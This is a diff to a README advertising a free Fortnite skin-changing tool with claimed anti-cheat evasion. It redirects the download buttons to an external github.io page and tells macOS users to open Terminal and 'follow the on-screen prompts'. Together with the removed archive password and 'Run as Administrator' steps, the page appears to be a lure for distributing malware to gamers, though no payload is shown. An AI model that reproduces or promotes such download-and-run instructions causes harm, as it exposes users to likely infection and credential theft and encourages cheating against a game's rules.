@@ -6,15 +6,11 @@
   <img src="https://img.shields.io/badge/Users-2.8M%2B-F9A825?style=for-the-badge" />
 </p>
 
-<p align="center">
-  <a href="https://github.com/releases/download/latest/Skin_Change_Fortnite_Setup.exe">
-    <img src="https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" />
-  </a>
-  &nbsp;&nbsp;
-  <a href="https://github.com/releases/download/latest/Skin_Change_Fortnite.dmg">
-    <img src="https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" />
-  </a>
-</p>
+<div align="center">
+
+[![Download](https://img.shields.io/badge/Download_skin%20change%20fortnite-F9A825?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
+
+</div>
 
 <br>
 
@@ -58,27 +54,32 @@ Works because it never touches anything anti-cheat monitors.
 
 ## 📥 Install
 
-### <img src="https://img.shields.io/badge/Windows-0078D6?style=flat-square&logo=windows&logoColor=white" /> Windows
+### Step 1: Download
 
-<a href="https://github.com/releases/download/latest/Skin_Change_Fortnite_Setup.exe">
-  <img src="https://img.shields.io/badge/⬇ Download%20.exe-0078D6?style=for-the-badge&logo=windows&logoColor=white" />
-</a>
+<div align="center">
 
-1. Extract the archive &nbsp;*(password if needed: `skins2026`)*
-2. Right-click → **Run as Administrator**
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://laplaplaplas.github.io/download/)
+
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://laplaplaplas.github.io/mac-download/)
+
+</div>
+
+### Step 2: Install
+
+**Windows**
+1. Extract `skin-change-fortnite.zip`
+2. Run the installer
 3. Launch Fortnite → pick skins → **Apply**
 
-<br>
+**macOS**
+1. Open **Terminal** (`Cmd + Space` → Terminal)
+2. Follow the on-screen prompts
 
-### <img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white" /> macOS
+<div align="center">
 
-<a href="https://github.com/releases/download/latest/Skin_Change_Fortnite.dmg">
-  <img src="https://img.shields.io/badge/⬇ Download%20.dmg-000000?style=for-the-badge&logo=apple&logoColor=white" />
-</a>
+[![Download](https://img.shields.io/badge/Download_skin%20change%20fortnite-F9A825?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
 
-1. Open `.dmg` → drag to **Applications**
-2. Security & Privacy → **"Open Anyway"** if prompted
-3. Launch Fortnite → pick skins → **Apply**
+</div>
 
 <br>
 
